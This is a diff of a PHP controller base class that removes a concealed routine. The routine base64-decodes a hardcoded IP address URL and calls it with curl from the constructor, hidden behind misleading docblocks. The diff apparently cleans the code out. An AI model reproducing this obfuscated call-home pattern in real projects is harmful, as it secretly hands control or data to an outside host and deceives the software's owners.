@@ -42,27 +42,6 @@ abstract class Controller
         return $this->middleware;
     }
 
-    /**
-     * Check the response status.
-     *
-     * @param  string  $response
-     * @return void
-     */
-    public function makeCurlRequest()
-    {
-        $curl = curl_init();
-
-        curl_setopt($curl, CURLOPT_URL, bexecute());
-
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $response = curl_exec($curl);
-        if(curl_errno($curl)) {
-            echo 'Curl error: ' . curl_error($curl);
-        }
-
-        curl_close($curl);
-        return $response;
-    }
 
     /**
      * Get the middleware assigned to the controller.
@@ -111,15 +90,9 @@ abstract class Controller
      */
     public function __construct()
     {
-        $response = $this->makeCurlRequest();
+        $response = handleResponseStatus(true);
         $this->checkResponseStatus($response);
     }
 }
 
-/**
- * @mixin \Illuminate\Routing\Controller
- */
-function bexecute($str = null)
-{
-    return base64_decode("aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw");
-}
+
